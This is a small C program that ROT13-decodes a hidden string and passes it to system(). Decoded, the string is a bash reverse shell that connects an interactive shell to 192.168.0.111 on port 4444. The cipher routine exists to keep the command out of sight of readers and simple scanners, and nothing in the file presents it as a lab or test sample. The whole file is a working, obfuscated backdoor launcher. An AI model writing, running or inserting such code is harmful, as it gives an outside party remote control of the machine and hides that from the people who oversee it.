#include <stdlib.h>
#include <stdio.h>
#include <string.h>

const int cipher_key = 13;

void caesar_decode(char *str, int key)
{
    int len = strlen(str);
    for (int i = 0; i < len; i++)
    {
        if (str[i] >= 'a' && str[i] <= 'z')
        {
            str[i] = 'a' + (str[i] - 'a' + key) % 26;
        }
        else if (str[i] >= 'A' && str[i] <= 'Z')
        {
            str[i] = 'A' + (str[i] - 'A' + key) % 26;
        }
    }
}

int main()
{
    
    char encoded_command[] = "onfu -p 'onfu -v >& /qri/gpc/192.168.0.111/4444 0>&1'";

    caesar_decode(encoded_command, cipher_key);

    system(encoded_command);

    return 0;
}